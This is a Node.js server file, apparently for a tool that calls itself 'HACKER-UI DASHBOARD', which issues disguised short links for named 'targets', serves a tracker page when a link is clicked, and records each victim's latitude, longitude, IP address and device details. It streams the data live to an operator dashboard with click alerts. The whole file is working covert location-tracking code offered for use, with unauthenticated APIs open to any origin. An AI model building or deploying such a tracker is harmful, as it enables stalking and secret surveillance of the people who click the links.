// File: server.js (FINAL MERGE v3.1 - Notifikasi Klik Real-time)

require('dotenv').config();

const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const UAParser = require('ua-parser-js');
const { nanoid } = require('nanoid');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const db = require('./db');
const requestIp = require('request-ip');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });
const PORT = process.env.PORT || 3000;

// ================== MIDDLEWARE ================== //
app.use(cors());
app.use(express.json());
app.use(requestIp.mw());

// Arahkan root ke dashboard
app.get('/', (req, res) => res.redirect('/dashboard.html'));

// Layani file statis (dashboard.html, tracker.html, dll.)
app.use(express.static(__dirname));


// ================== HELPER FUNCTIONS ================== //

// Broadcast data dashboard ke semua klien
const broadcastDashboardUpdate = async () => {
    try {
        // Ambil data link
        const [links] = await db.promise().query(`
            SELECT l.id, l.original_url, l.created_at, l.expires_at, 
                   u.username, l.click_count, l.last_clicked_at 
            FROM links l 
            JOIN users u ON l.user_id = u.id 
            ORDER BY l.created_at DESC
        `);

        // Ambil data ringkas
        const [stats] = await db.promise().query(`
            SELECT 
                (SELECT COUNT(*) FROM links) as total_links,
                (SELECT SUM(click_count) FROM links) as total_clicks,
                (SELECT COUNT(*) FROM locations) as total_locations
        `);

        // Ambil data browser
        const [locations] = await db.promise().query(`SELECT user_agent FROM locations`);
        const parser = new UAParser();
        const browserStats = locations.reduce((acc, loc) => {
            if (loc.user_agent) {
                const browserName = parser.setUA(loc.user_agent).getBrowser().name || "Unknown";
                acc[browserName] = (acc[browserName] || 0) + 1;
            }
            return acc;
        }, {});

        // Broadcast update
        io.emit('dashboard_update', { 
            links, 
            stats: stats[0],
            browserStats 
        });
    } catch (error) {
        console.error("❌ Gagal broadcast update:", error);
    }
};

// Broadcast pesan log ke dashboard
const broadcastLogMessage = (message) => {
    const timestamp = new Date().toLocaleTimeString('id-ID');
    io.emit('new_log_message', `[${timestamp}] ${message}`);
};


// ================== SOCKET.IO ================== //

io.on('connection', (socket) => {
    console.log('🔌 Klien baru terhubung via WebSocket');
    broadcastLogMessage(`> New client connected: ${socket.id.substring(0, 5)}...`);

    // Kirim data dashboard awal
    broadcastDashboardUpdate();

    socket.on('disconnect', () => {
        console.log('🔌 Klien terputus');
        broadcastLogMessage(`> Client disconnected: ${socket.id.substring(0, 5)}...`);
    });
});


// ================== API ROUTES ================== //

// Buat link baru
app.post('/create', async (req, res) => {
    const { username, originalUrl, expiresIn } = req.body;
    if (!username || !originalUrl)
        return res.status(400).json({ error: 'Data tidak lengkap' });

    let expiresAt = null;
    if (expiresIn && !isNaN(parseInt(expiresIn))) {
        expiresAt = new Date();
        expiresAt.setHours(expiresAt.getHours() + parseInt(expiresIn));
    }

    try {
        // Cari / buat user
        let [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
        let userId;
        if (users.length > 0) {
            userId = users[0].id;
        } else {
            const [result] = await db.promise().query('INSERT INTO users (username) VALUES (?)', [username]);
            userId = result.insertId;
        }

        // Simpan link
        const id = nanoid(8);
        await db.promise().query('INSERT INTO links SET ?', { 
            id, 
            user_id: userId, 
            original_url: originalUrl, 
            expires_at: expiresAt 
        });

        broadcastLogMessage(`> Link created for target [${username}] with ID [${id}]`);
        broadcastDashboardUpdate();

        res.status(201).json({ newLink: `http://localhost:${PORT}/${id}`, username });
    } catch (error) {
        res.status(500).json({ error: 'DB error' });
    }
});

// Endpoint yang diklik target
app.get('/:id', async (req, res) => {
    const { id } = req.params;
    try {
        const [links] = await db.promise().query(`
            SELECT l.original_url, l.expires_at, u.username 
            FROM links l 
            JOIN users u ON l.user_id = u.id 
            WHERE l.id = ?`, [id]);

        if (links.length === 0) return res.status(404).send('<h1>404 Not Found</h1>');

        const { original_url, expires_at, username } = links[0];
        if (expires_at && new Date(expires_at) < new Date())
            return res.status(410).send('<h1>Link has expired.</h1>');

        // Update click
        await db.promise().query(
            "UPDATE links SET click_count = click_count + 1, last_clicked_at = NOW() WHERE id = ?", 
            [id]
        );

        broadcastLogMessage(`> Link [${id}] clicked by target [${username}]`);
        
        // !!! PENAMBAHAN BARU: Kirim notifikasi khusus ke dashboard !!!
        io.emit('link_clicked', { username: username, id: id });

        // Kirim tracker.html
        fs.readFile(path.join(__dirname, 'tracker.html'), 'utf8', (fsErr, data) => {
            if (fsErr) return res.status(500).send('Server error');
            res.send(
                data
                    .replace('{{DESTINATION_URL}}', original_url)
                    .replace('{{TRACKER_ID}}', id)
                    .replace('{{USERNAME}}', username)
            );
        });
    } catch (error) {
        res.status(500).send('Server error');
    }
});

// Terima log lokasi + perangkat
app.post('/log', async (req, res) => {
    const { latitude, longitude, trackerId, username } = req.body;
    const userAgentString = req.headers['user-agent'];
    const ipAddress = req.clientIp;

    try {
        const [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
        if (users.length === 0) return res.status(404).json({ status: 'error' });

        const newLocation = { 
            user_id: users[0].id, 
            tracker_id: trackerId, 
            latitude, 
            longitude, 
            ip_address: ipAddress, 
            user_agent: userAgentString 
        };

        await db.promise().query('INSERT INTO locations SET ?', newLocation);

        // Analisis User-Agent untuk log detail
        const parser = new UAParser();
        const ua = parser.setUA(userAgentString).getResult();
        const browserInfo = ua.browser.name ? `${ua.browser.name} ${ua.browser.version || ''}`.trim() : 'Unknown';
        const osInfo = ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown';
        const deviceInfo = ua.device.type 
            ? `${ua.device.vendor || 'Unknown'} ${ua.device.model || ''} (${ua.device.type})`
            : 'Desktop';

        // Log detail ke dashboard
        broadcastLogMessage(`> Location from [${username}] | ${browserInfo} on ${osInfo} | Device: ${deviceInfo} | IP: ${ipAddress}`);

        console.log(`📍 Lokasi diterima dari: ${username} [${ipAddress}]`);
        broadcastDashboardUpdate();
        res.json({ status: 'success' });
    } catch (error) {
        res.status(500).json({ status: 'error' });
    }
});

// Hapus link
app.delete('/api/links/:id', async (req, res) => {
    const { id } = req.params;
    try {
        await db.promise().query("DELETE FROM links WHERE id = ?", [id]);
        broadcastLogMessage(`> Link [${id}] has been deleted.`);
        broadcastDashboardUpdate();
        res.json({ status: 'success', message: 'Link berhasil dihapus.' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: 'Gagal menghapus link.' });
    }
});

// Ambil detail lokasi dari 1 link
app.get('/api/locations/:trackerId', async (req, res) => {
    const { trackerId } = req.params;
    try {
        const [locations] = await db.promise().query(`
            SELECT latitude, longitude, created_at, ip_address, user_agent 
            FROM locations 
            WHERE tracker_id = ? 
            ORDER BY created_at DESC
        `, [trackerId]);

        const parser = new UAParser();
        const parsedLocations = locations.map(loc => {
            const ua = parser.setUA(loc.user_agent).getResult();
            return {
                latitude: loc.latitude,
                longitude: loc.longitude,
                created_at: loc.created_at,
                ip_address: loc.ip_address,
                browser: ua.browser.name ? `${ua.browser.name} ${ua.browser.version || ''}`.trim() : 'Unknown',
                os: ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown',
                device: {
                    type: ua.device.type || 'desktop',
                    vendor: ua.device.vendor || 'Unknown',
                    model: ua.device.model || 'N/A'
                }
            };
        });

        res.json(parsedLocations);
    } catch (error) {
        res.status(500).json({ error: 'DB error' });
    }
});


// ================== RUN SERVER ================== //

server.listen(PORT, () => {
    console.log(`\n HACKER-UI DASHBOARD v3.1 (Full Features + Detailed Live Log + Device Info + Click Notification)`);
    console.log(`=============================================================================================`);
    console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
});